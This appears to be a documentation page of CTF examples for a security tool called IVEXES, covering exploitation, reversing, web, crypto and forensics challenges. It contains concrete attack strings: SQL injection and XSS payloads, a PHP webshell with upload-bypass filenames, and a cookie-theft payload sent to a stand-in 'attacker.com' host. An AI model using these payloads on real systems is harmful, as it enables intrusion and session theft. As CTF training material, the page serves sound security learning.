# CTF Challenge Examples

This guide demonstrates how to use IVEXES for Capture The Flag (CTF) competitions and security challenges, covering various categories and solution approaches.

## Binary Exploitation (Pwn)

### Stack-Based Buffer Overflow

```python
from ivexes.agents import SingleAgent
from ivexes.sandbox import Sandbox
from ivexes.code_browser import CodeBrowser

# Initialize specialized binary exploitation agent
pwn_agent = SingleAgent(
    specialization="binary_exploitation",
    tools=["gdb", "pwntools", "ghidra", "radare2"]
)

# Analyze the challenge binary
binary_path = "/challenges/pwn/buffer_overflow"
code_browser = CodeBrowser()

# Static analysis first
static_analysis = code_browser.analyze_binary(binary_path)
print("Binary Analysis:")
print(f"Architecture: {static_analysis.architecture}")
print(f"Security features: {static_analysis.security_features}")
print(f"Dangerous functions: {static_analysis.dangerous_functions}")

# Dynamic analysis in sandbox
sandbox = Sandbox(
    enable_debugging=True,
    capture_core_dumps=True,
    trace_execution=True
)

# Test for buffer overflow
test_inputs = [
    b"A" * i for i in range(50, 200, 10)
]

for test_input in test_inputs:
    result = sandbox.execute(
        binary_path,
        stdin=test_input,
        timeout=10
    )
    
    if result.crashed:
        print(f"Crash detected with input size: {len(test_input)}")
        print(f"Signal: {result.crash_signal}")
        
        # Analyze crash
        crash_analysis = pwn_agent.analyze_crash(result.core_dump)
        if crash_analysis.controllable_pc:
            print("🎯 EIP/RIP control achieved!")
            
            # Generate exploit
            exploit = pwn_agent.generate_buffer_overflow_exploit(
                binary_path=binary_path,
                crash_offset=crash_analysis.crash_offset,
                target_function="system",
                payload="/bin/sh"
            )
            
            print(f"Exploit generated: {exploit.code}")
            break
```

### Return-Oriented Programming (ROP)

```python
# Advanced ROP chain exploitation
from ivexes.tools import ROPGadgetFinder, ExploitGenerator

# Find ROP gadgets
rop_finder = ROPGadgetFinder()
gadgets = rop_finder.find_gadgets(
    binary_path=binary_path,
    gadget_types=["pop_ret", "mov_ret", "add_ret", "syscall"]
)

# Build ROP chain for execve("/bin/sh", NULL, NULL)
rop_chain = pwn_agent.build_rop_chain(
    gadgets=gadgets,
    target_syscall="execve",
    arguments=["/bin/sh", 0, 0],
    architecture="x86_64"
)

# Test ROP exploit
rop_exploit = pwn_agent.craft_rop_exploit(
    crash_offset=crash_analysis.crash_offset,
    rop_chain=rop_chain,
    binary_base=static_analysis.base_address
)

rop_result = sandbox.execute(
    binary_path,
    stdin=rop_exploit.payload,
    expect_shell=True
)

if rop_result.shell_spawned:
    print("🏆 ROP exploit successful!")
    flag = rop_result.execute_command("cat flag.txt")
    print(f"Flag: {flag}")
```

### Format String Vulnerability

```python
# Exploit format string vulnerability
format_string_test = b"%x." * 20

fs_result = sandbox.execute(
    "/challenges/pwn/format_string",
    stdin=format_string_test
)

# Analyze format string output
fs_analysis = pwn_agent.analyze_format_string_output(fs_result.stdout)

if fs_analysis.vulnerable:
    print("Format string vulnerability detected!")
    print(f"Stack leak offset: {fs_analysis.stack_offset}")
    
    # Exploit for arbitrary read/write
    arbitrary_read_exploit = pwn_agent.craft_format_string_exploit(
        target="arbitrary_read",
        address=0x804a020,  # GOT entry
        format_offset=fs_analysis.stack_offset
    )
    
    # Read GOT to defeat ASLR
    got_leak = sandbox.execute(
        "/challenges/pwn/format_string",
        stdin=arbitrary_read_exploit
    )
    
    leaked_address = pwn_agent.parse_format_string_leak(got_leak.stdout)
    libc_base = pwn_agent.calculate_libc_base(leaked_address)
    
    # Craft write exploit to overwrite GOT
    write_exploit = pwn_agent.craft_format_string_write(
        target_address=0x804a020,  # printf GOT entry
        write_value=libc_base + 0x45390,  # system offset
        format_offset=fs_analysis.stack_offset
    )
    
    final_result = sandbox.execute(
        "/challenges/pwn/format_string",
        stdin=write_exploit + b"/bin/sh\x00"
    )
```

## Reverse Engineering

### Malware Analysis

```python
from ivexes.tools import StaticAnalyzer, DynamicAnalyzer

# Analyze suspicious binary
malware_path = "/challenges/re/suspicious_binary"

# Static analysis
static_analyzer = StaticAnalyzer()
malware_analysis = static_analyzer.analyze_malware(malware_path)

print("Malware Analysis Results:")
print(f"Packer detected: {malware_analysis.packer}")
print(f"Anti-debug techniques: {malware_analysis.anti_debug}")
print(f"Encryption detected: {malware_analysis.encryption}")
print(f"Suspicious strings: {len(malware_analysis.suspicious_strings)}")

# Dynamic analysis with anti-evasion
dynamic_analyzer = DynamicAnalyzer(
    anti_vm_detection=True,
    anti_debug_bypass=True,
    api_hooking=True
)

# Run in controlled environment
malware_behavior = dynamic_analyzer.analyze_behavior(
    malware_path,
    monitor_apis=True,
    capture_network=True,
    monitor_files=True
)

# Extract key information
if malware_behavior.c2_communication:
    print(f"C2 Server: {malware_behavior.c2_server}")
    
if malware_behavior.persistence_mechanism:
    print(f"Persistence: {malware_behavior.persistence_mechanism}")

# Look for embedded flags or keys
embedded_data = static_analyzer.extract_embedded_data(malware_path)
for data in embedded_data:
    if data.looks_like_flag():
        print(f"Potential flag: {data.value}")
```

### Crackme Challenges

```python
# Solve crackme challenge
crackme_path = "/challenges/re/crackme1"

# Analyze password checking logic
password_analysis = code_browser.analyze_password_logic(crackme_path)

print("Password Analysis:")
print(f"Input length: {password_analysis.expected_length}")
print(f"Character constraints: {password_analysis.character_constraints}")
print(f"Algorithm type: {password_analysis.algorithm_type}")

if password_analysis.algorithm_type == "simple_comparison":
    # Extract hardcoded password
    hardcoded_password = static_analyzer.extract_strings(
        crackme_path,
        min_length=password_analysis.expected_length,
        max_length=password_analysis.expected_length
    )
    
    for candidate in hardcoded_password:
        test_result = sandbox.execute(
            crackme_path,
            stdin=candidate.encode(),
            capture_output=True
        )
        
        if "correct" in test_result.stdout.lower():
            print(f"🔑 Password found: {candidate}")
            break

elif password_analysis.algorithm_type == "mathematical":
    # Reverse mathematical algorithm
    math_solver = pwn_agent.solve_mathematical_challenge(
        algorithm=password_analysis.algorithm,
        target_value=password_analysis.target_value
    )
    
    solution = math_solver.solve()
    print(f"🧮 Mathematical solution: {solution}")

elif password_analysis.algorithm_type == "hash_based":
    # Brute force or rainbow table attack
    hash_cracker = pwn_agent.crack_hash(
        hash_type=password_analysis.hash_algorithm,
        target_hash=password_analysis.target_hash,
        charset="abcdefghijklmnopqrstuvwxyz0123456789",
        max_length=8
    )
    
    cracked_password = hash_cracker.crack()
    if cracked_password:
        print(f"🔓 Password cracked: {cracked_password}")
```

## Web Exploitation

### SQL Injection Challenges

```python
from ivexes.agents import SingleAgent
from ivexes.tools import WebExploiter

# Initialize web exploitation agent
web_agent = SingleAgent(
    specialization="web_exploitation",
    tools=["sqlmap", "burp", "custom_payloads"]
)

# Test for SQL injection
target_url = "http://challenge.ctf/login.php"
sql_payloads = [
    "' OR 1=1 --",
    "' UNION SELECT 1,2,3 --",
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "admin'--"
]

for payload in sql_payloads:
    injection_test = web_agent.test_sql_injection(
        url=target_url,
        parameter="username",
        payload=payload,
        method="POST"
    )
    
    if injection_test.vulnerable:
        print(f"✓ SQL injection confirmed with payload: {payload}")
        
        # Enumerate database structure
        db_enum = web_agent.enumerate_database(
            url=target_url,
            injection_point=injection_test.injection_point,
            techniques=["union_based", "boolean_based", "time_based"]
        )
        
        print(f"Database: {db_enum.database_name}")
        print(f"Tables: {db_enum.tables}")
        
        # Extract sensitive data
        for table in db_enum.tables:
            if "user" in table.lower() or "admin" in table.lower():
                data = web_agent.extract_table_data(
                    url=target_url,
                    injection_point=injection_test.injection_point,
                    table_name=table
                )
                
                for row in data:
                    if "flag" in str(row).lower():
                        print(f"🏁 Flag found: {row}")
                        break
        break
```

### Cross-Site Scripting (XSS)

```python
# Test for XSS vulnerabilities
xss_payloads = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert('XSS');//"
]

search_url = "http://challenge.ctf/search.php"

for payload in xss_payloads:
    xss_test = web_agent.test_xss(
        url=search_url,
        parameter="q",
        payload=payload
    )
    
    if xss_test.vulnerable:
        print(f"✓ XSS vulnerability found with: {payload}")
        
        # Craft payload to steal admin session
        session_steal_payload = web_agent.craft_session_theft_payload(
            target_url="http://attacker.com/steal.php",
            xss_payload=payload
        )
        
        # If this is a stored XSS, try to get admin to visit
        if xss_test.xss_type == "stored":
            print("💾 Stored XSS - waiting for admin interaction")
            # Set up listener for stolen sessions
            session_listener = web_agent.setup_session_listener()
            
            # Submit malicious payload
            web_agent.submit_stored_xss(
                url=search_url,
                payload=session_steal_payload
            )
        break
```

### File Upload Vulnerabilities

```python
# Test file upload security
upload_url = "http://challenge.ctf/upload.php"

# Test various bypass techniques
upload_tests = [
    # PHP webshell
    {
        "filename": "shell.php",
        "content": "<?php system($_GET['cmd']); ?>",
        "mime_type": "application/x-php"
    },
    # Double extension
    {
        "filename": "image.jpg.php",
        "content": "<?php system($_GET['cmd']); ?>",
        "mime_type": "image/jpeg"
    },
    # Null byte injection
    {
        "filename": "shell.php%00.jpg",
        "content": "<?php system($_GET['cmd']); ?>",
        "mime_type": "image/jpeg"
    },
    # MIME type bypass
    {
        "filename": "shell.php",
        "content": "GIF89a\n<?php system($_GET['cmd']); ?>",
        "mime_type": "image/gif"
    }
]

for test in upload_tests:
    upload_result = web_agent.test_file_upload(
        url=upload_url,
        filename=test["filename"],
        content=test["content"],
        mime_type=test["mime_type"]
    )
    
    if upload_result.successful:
        print(f"✓ File upload successful: {test['filename']}")
        
        # Try to execute uploaded file
        webshell_url = f"http://challenge.ctf/uploads/{test['filename']}"
        command_result = web_agent.execute_webshell_command(
            url=webshell_url,
            command="cat flag.txt"
        )
        
        if command_result.successful:
            print(f"🏁 Flag retrieved: {command_result.output}")
            break
```

## Cryptography Challenges

### Classical Ciphers

```python
from ivexes.tools import CryptographyAnalyzer

crypto_analyzer = CryptographyAnalyzer()

# Caesar cipher analysis
ciphertext = "WKLV LV D VHFUHW PHVVDJH"
caesar_analysis = crypto_analyzer.analyze_caesar_cipher(ciphertext)

print("Caesar Cipher Analysis:")
for shift, plaintext in caesar_analysis.possible_shifts:
    if crypto_analyzer.looks_like_english(plaintext):
        print(f"Shift {shift}: {plaintext}")

# Vigenère cipher analysis
vigenere_text = "LXFOPVEFRNHR"
vigenere_analysis = crypto_analyzer.analyze_vigenere_cipher(
    ciphertext=vigenere_text,
    key_length_range=(3, 8)
)

print("Vigenère Analysis:")
print(f"Likely key length: {vigenere_analysis.key_length}")
print(f"Probable key: {vigenere_analysis.key}")
print(f"Decrypted text: {vigenere_analysis.plaintext}")

# Frequency analysis for substitution ciphers
substitution_text = "BU BT B TYOUVQBUQV FQOXU"
freq_analysis = crypto_analyzer.frequency_analysis(substitution_text)
substitution_key = crypto_analyzer.solve_substitution_cipher(
    ciphertext=substitution_text,
    frequency_analysis=freq_analysis
)

print(f"Substitution key: {substitution_key}")
```

### Modern Cryptography

```python
# RSA challenges
rsa_challenge = {
    "n": 0x9b1b5d6e9a234567890abcdef,
    "e": 65537,
    "c": 0x123456789abcdef0123456789
}

# Test for weak RSA implementations
rsa_analyzer = crypto_analyzer.analyze_rsa(
    n=rsa_challenge["n"],
    e=rsa_challenge["e"],
    c=rsa_challenge["c"]
)

if rsa_analyzer.small_primes:
    print("🔍 Small prime factors detected")
    factors = crypto_analyzer.factor_small_composite(rsa_challenge["n"])
    print(f"Factors: {factors}")
    
    # Calculate private key and decrypt
    d = crypto_analyzer.calculate_rsa_private_key(
        p=factors[0],
        q=factors[1],
        e=rsa_challenge["e"]
    )
    
    plaintext = crypto_analyzer.rsa_decrypt(
        ciphertext=rsa_challenge["c"],
        d=d,
        n=rsa_challenge["n"]
    )
    
    print(f"🔓 Decrypted message: {plaintext}")

elif rsa_analyzer.common_modulus_attack_possible:
    print("🎯 Common modulus attack possible")
    # Implementation for common modulus attack
    
elif rsa_analyzer.wieners_attack_possible:
    print("🎯 Wiener's attack possible")
    # Implementation for Wiener's attack

# AES challenges
aes_challenge = {
    "ciphertext": "3f4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d",
    "iv": "1234567890abcdef1234567890abcdef",
    "mode": "CBC"
}

# Test for ECB mode
if aes_challenge["mode"] == "ECB":
    ecb_analysis = crypto_analyzer.analyze_aes_ecb(aes_challenge["ciphertext"])
    if ecb_analysis.repeated_blocks:
        print("📊 ECB mode detected - identical blocks found")

# Test for weak keys or known plaintext attacks
aes_weaknesses = crypto_analyzer.find_aes_weaknesses(aes_challenge)
if aes_weaknesses.weak_key:
    print("🔑 Weak AES key detected")
```

## Forensics Challenges

### File Analysis and Recovery

```python
from ivexes.tools import ForensicsAnalyzer

forensics_analyzer = ForensicsAnalyzer()

# Analyze suspicious file
suspicious_file = "/challenges/forensics/evidence.pcap"
file_analysis = forensics_analyzer.analyze_file(suspicious_file)

print("File Analysis:")
print(f"File type: {file_analysis.file_type}")
print(f"Magic bytes: {file_analysis.magic_bytes}")
print(f"Hidden data: {file_analysis.hidden_data_detected}")

# Network forensics
if file_analysis.file_type == "pcap":
    pcap_analysis = forensics_analyzer.analyze_pcap(suspicious_file)
    
    print("Network Analysis:")
    print(f"Unique hosts: {len(pcap_analysis.unique_hosts)}")
    print(f"Protocols: {pcap_analysis.protocols}")
    
    # Look for suspicious traffic
    suspicious_traffic = pcap_analysis.find_suspicious_patterns([
        "large_data_transfers",
        "unusual_protocols",
        "encrypted_channels",
        "dns_exfiltration"
    ])
    
    # Extract files from HTTP traffic
    extracted_files = forensics_analyzer.extract_http_files(suspicious_file)
    for file_info in extracted_files:
        if file_info.looks_suspicious():
            print(f"🚨 Suspicious file: {file_info.filename}")
            
            # Analyze extracted file
            extracted_analysis = forensics_analyzer.analyze_file(file_info.path)
            if "flag" in extracted_analysis.strings:
                print(f"🏁 Flag found in extracted file!")

# Image forensics
elif file_analysis.file_type in ["jpeg", "png", "gif"]:
    image_analysis = forensics_analyzer.analyze_image(suspicious_file)
    
    # Check for steganography
    stego_analysis = forensics_analyzer.detect_steganography(
        image_path=suspicious_file,
        techniques=["lsb", "dct", "metadata"]
    )
    
    if stego_analysis.hidden_data_found:
        print("🖼️ Hidden data detected in image")
        hidden_data = forensics_analyzer.extract_hidden_data(
            image_path=suspicious_file,
            technique=stego_analysis.technique
        )
        
        if hidden_data.looks_like_flag():
            print(f"🏁 Flag extracted: {hidden_data.content}")

# Memory dump analysis
elif file_analysis.file_type == "memory_dump":
    memory_analysis = forensics_analyzer.analyze_memory_dump(suspicious_file)
    
    # Extract running processes
    processes = memory_analysis.extract_processes()
    for process in processes:
        if process.suspicious:
            print(f"🔍 Suspicious process: {process.name} (PID: {process.pid})")
    
    # Extract network connections
    connections = memory_analysis.extract_network_connections()
    for conn in connections:
        if conn.external and conn.suspicious:
            print(f"🌐 Suspicious connection: {conn.remote_address}")
    
    # Search for flags in memory
    flag_search = memory_analysis.search_for_flags(
        patterns=["flag{", "CTF{", "FLAG:"]
    )
    
    for flag in flag_search:
        print(f"🏁 Flag found in memory: {flag}")
```

### Data Recovery and Carving

```python
# File carving from disk image
disk_image = "/challenges/forensics/disk.img"
carved_files = forensics_analyzer.carve_files(
    image_path=disk_image,
    file_types=["jpeg", "png", "pdf", "zip", "exe"]
)

print(f"Carved {len(carved_files)} files")

for carved_file in carved_files:
    # Analyze each carved file
    carved_analysis = forensics_analyzer.analyze_file(carved_file.path)
    
    if carved_analysis.contains_flag():
        print(f"🏁 Flag found in carved file: {carved_file.filename}")
    
    # Check for encrypted files
    if carved_analysis.encrypted:
        # Try common passwords
        password_list = ["password", "123456", "admin", "ctf", "flag"]
        for password in password_list:
            if forensics_analyzer.try_decrypt(carved_file.path, password):
                decrypted_content = forensics_analyzer.decrypt_file(
                    carved_file.path, 
                    password
                )
                if "flag" in decrypted_content.lower():
                    print(f"🔓 Decrypted flag with password: {password}")
                break

# Timeline analysis
timeline = forensics_analyzer.create_timeline(disk_image)
suspicious_events = timeline.find_suspicious_events([
    "file_deletion_during_incident",
    "unusual_access_times",
    "modified_system_files"
])

for event in suspicious_events:
    print(f"⚠️ Suspicious event: {event.description} at {event.timestamp}")
```

## Automation and Scripting

### Automated CTF Challenge Solver

```python
from ivexes.agents import MultiAgent
from ivexes.tools import CTFSolver

# Create specialized CTF team
ctf_team = MultiAgent(
    num_agents=4,
    specializations=["pwn", "crypto", "web", "forensics", "reversing"]
)

# Configure CTF platform
ctf_platform = CTFSolver(
    platform_url="https://ctf.example.com",
    team_token="your_team_token"
)

# Get available challenges
challenges = ctf_platform.get_challenges()

# Distribute challenges to appropriate agents
for challenge in challenges:
    category = challenge.category.lower()
    
    if category == "pwn":
        pwn_agent = ctf_team.get_agent("pwn")
        solution = pwn_agent.solve_challenge(challenge)
        
    elif category == "crypto":
        crypto_agent = ctf_team.get_agent("crypto")
        solution = crypto_agent.solve_challenge(challenge)
        
    elif category == "web":
        web_agent = ctf_team.get_agent("web")
        solution = web_agent.solve_challenge(challenge)
        
    elif category == "forensics":
        forensics_agent = ctf_team.get_agent("forensics")
        solution = forensics_agent.solve_challenge(challenge)
        
    elif category == "reversing":
        re_agent = ctf_team.get_agent("reversing")
        solution = re_agent.solve_challenge(challenge)
    
    # Submit solution if found
    if solution and solution.flag:
        submission_result = ctf_platform.submit_flag(
            challenge_id=challenge.id,
            flag=solution.flag
        )
        
        if submission_result.correct:
            print(f"✅ {challenge.name}: {solution.flag}")
            ctf_team.share_success_knowledge(challenge, solution)
        else:
            print(f"❌ {challenge.name}: Incorrect flag")
            ctf_team.share_failure_knowledge(challenge, solution)

# Monitor team performance
team_stats = ctf_team.get_performance_stats()
print(f"\nTeam Performance:")
print(f"Challenges solved: {team_stats.solved_count}")
print(f"Total points: {team_stats.total_points}")
print(f"Team ranking: {team_stats.ranking}")
```

### Challenge Development and Testing

```python
from ivexes.tools import ChallengeDeveloper

# Develop new CTF challenges
challenge_dev = ChallengeDeveloper()

# Create a buffer overflow challenge
bof_challenge = challenge_dev.create_pwn_challenge(
    vulnerability_type="buffer_overflow",
    difficulty="medium",
    architecture="x86_64",
    protections=["nx", "aslr"],
    flag="CTF{buffer_overflow_mastered}"
)

# Test the challenge
test_result = challenge_dev.test_challenge(
    challenge=bof_challenge,
    expected_solution_time=30  # minutes
)

if test_result.solvable:
    print("✅ Challenge is solvable")
    print(f"Average solve time: {test_result.avg_solve_time} minutes")
    print(f"Difficulty rating: {test_result.difficulty_rating}")
else:
    print("❌ Challenge has issues:")
    for issue in test_result.issues:
        print(f"  - {issue}")

# Create a crypto challenge
crypto_challenge = challenge_dev.create_crypto_challenge(
    cipher_type="rsa",
    weakness="small_primes",
    difficulty="easy",
    flag="CTF{rsa_factorization_easy}"
)

# Create a web challenge
web_challenge = challenge_dev.create_web_challenge(
    vulnerability_type="sql_injection",
    framework="flask",
    difficulty="hard",
    flag="CTF{advanced_sql_injection}"
)

# Package challenges for deployment
challenge_package = challenge_dev.package_challenges([
    bof_challenge,
    crypto_challenge,
    web_challenge
])

print(f"Challenge package created: {challenge_package.path}")
print(f"Deployment instructions: {challenge_package.readme}")
```

## Best Practices for CTF

### Efficient Problem-Solving Workflow

1. **Quick Reconnaissance**: Rapid initial assessment of challenge type
2. **Tool Selection**: Choose appropriate tools for the challenge category
3. **Systematic Approach**: Follow structured methodologies for each category
4. **Documentation**: Keep detailed notes of attempts and findings
5. **Collaboration**: Share knowledge and techniques with team members

### Time Management

```python
from ivexes.tools import CTFTimer

# Set up time tracking for challenges
timer = CTFTimer()

# Track time spent on each challenge
with timer.track_challenge("crypto_rsa_challenge"):
    # Solve crypto challenge
    solution = crypto_agent.solve_challenge(challenge)

# Get time statistics
time_stats = timer.get_statistics()
print(f"Average time per category:")
for category, avg_time in time_stats.category_averages.items():
    print(f"  {category}: {avg_time} minutes")

# Identify time-consuming challenges
slow_challenges = timer.get_slow_challenges(threshold=60)  # >60 minutes
for challenge in slow_challenges:
    print(f"⏰ Slow challenge: {challenge.name} ({challenge.time_spent} min)")
```

### Knowledge Management

```python
from ivexes.tools import KnowledgeBase

# Build team knowledge base
kb = KnowledgeBase()

# Add successful techniques
kb.add_technique(
    category="pwn",
    technique="rop_chain_building",
    description="Systematic approach to ROP chain construction",
    code_example=rop_chain_code,
    success_rate=0.85
)

# Add useful tools and commands
kb.add_tool(
    name="pwntools",
    category="pwn",
    usage_examples=[
        "p = remote('host', port)",
        "payload = cyclic(100)",
        "elf = ELF('./binary')"
    ]
)

# Query knowledge base during challenges
relevant_techniques = kb.query(
    category="web",
    vulnerability="sql_injection",
    context="blind_injection"
)

for technique in relevant_techniques:
    print(f"💡 Suggested technique: {technique.name}")
    print(f"Success rate: {technique.success_rate}")
```

## See Also

- [Sandbox Analysis Examples](sandbox-analysis.md)
- [Binary Exploitation Guide](../user-guide/agents.md#binary-exploitation)
- [Web Security Testing](../user-guide/sandbox.md#web-application-testing)
- [Cryptography Tools](../api/tools.md#cryptography)